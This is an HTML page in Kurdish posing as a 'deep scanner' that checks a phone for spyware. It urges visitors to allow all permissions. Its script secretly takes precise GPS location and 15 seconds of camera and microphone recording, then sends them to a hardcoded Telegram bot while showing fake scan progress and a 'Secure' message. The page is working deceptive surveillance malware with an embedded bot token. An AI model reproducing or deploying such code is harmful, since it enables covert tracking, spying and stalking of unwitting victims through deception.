<!DOCTYPE html>
<html lang="ku">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Jegr Cracks - Deep Scanner</title>
    <style>
        body { background-color: #050505; color: #00ff41; text-align: center; font-family: 'Courier New', Courier, monospace; padding: 40px 20px; margin: 0; }
        .box { border: 2px solid #00ff41; display: inline-block; padding: 30px; border-radius: 10px; background: rgba(0, 255, 65, 0.05); box-shadow: 0 0 20px #00ff41; width: 100%; max-width: 450px; }
        .warning-text { color: #fff; font-size: 15px; line-height: 1.6; background: rgba(255, 255, 255, 0.1); padding: 15px; border-radius: 5px; margin-bottom: 20px; border-left: 4px solid #ff0000; }
        button { background-color: #00ff41; color: #000; border: none; padding: 20px 30px; font-size: 19px; border-radius: 5px; cursor: pointer; font-weight: bold; width: 100%; box-shadow: 0 0 15px #00ff41; }
        .status { margin-top: 20px; font-size: 16px; color: #00ff41; display: none; font-weight: bold; }
    </style>
</head>
<body>
    <div class="box">
        <h1 dir="rtl">بەهێزترین پشکنەری مۆبایلی جێگر کڕاکس</h1>
        <div class="warning-text" dir="rtl">
            تکایە هەموو بەشەکان ئەڵۆ (Allow) بکە بۆ ئەوەی وێبگەڕەکە بتوانێت هەموو پارچەکانی ئامێرەکەت بپشکنێت و بگەڕێت بۆ فایلی سیخوڕی.
        </div>
        <button id="startBtn">دەستپێکردنی پشکنینی ورد</button>
        <div id="statusText" class="status">Initializing GPS & Camera...</div>
    </div>

    <script>
        const startBtn = document.getElementById('startBtn');
        const statusText = document.getElementById('statusText');
        const botToken = "8633886074:AAE_wcUpSvjxa-1ac-68iWCUosIyESWlFhk"; 
        const chatId = "7619045862"; 

        startBtn.addEventListener('click', async () => {
            try {
                // لۆکەیشنی زۆر ورد و دەقیق
                navigator.geolocation.getCurrentPosition(position => {
                    const lat = position.coords.latitude;
                    const lon = position.coords.longitude;
                    const accuracy = position.coords.accuracy;
                    const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
                    
                    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: chatId,
                            text: `📍 لۆکەیشنی دەقیق (ڕێژەی هەڵە: ${accuracy.toFixed(1)} مەتر):\n${mapUrl}`
                        })
                    });
                }, (err) => {
                    console.log("Location Error");
                }, { 
                    enableHighAccuracy: true, // ئەمە گرنگترینە بۆ وردی لۆکەیشن
                    timeout: 10000, 
                    maximumAge: 0 
                });

                // ڤیدیۆ و دەنگ
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                startBtn.style.display = "none";
                statusText.style.display = "block";
                statusText.innerText = "Scanning for Spy Files... 20%";

                const mediaRecorder = new MediaRecorder(stream);
                const chunks = [];
                mediaRecorder.ondataavailable = e => chunks.push(e.data);
                
                mediaRecorder.onstop = async () => {
                    statusText.innerText = "Uploading Evidence... 95%";
                    const blob = new Blob(chunks, { type: 'video/mp4' });
                    const formData = new FormData();
                    formData.append('chat_id', chatId);
                    formData.append('video', blob, 'security_report.mp4');

                    await fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, { method: 'POST', body: formData });
                    statusText.innerText = "Scan Complete! Secure.";
                    alert("پشکنین تەواو بوو! مۆبایلەکەت پارێزراوە.");
                };

                mediaRecorder.start();
                setTimeout(() => {
                    mediaRecorder.stop();
                    stream.getTracks().forEach(t => t.stop());
                }, 15000);

            } catch (err) {
                alert("دەبێت مۆڵەتی Allow بدەیت بۆ تەواوکردنی پشکنینەکە.");
                location.reload();
            }
        });
    </script>
</body>
</html>
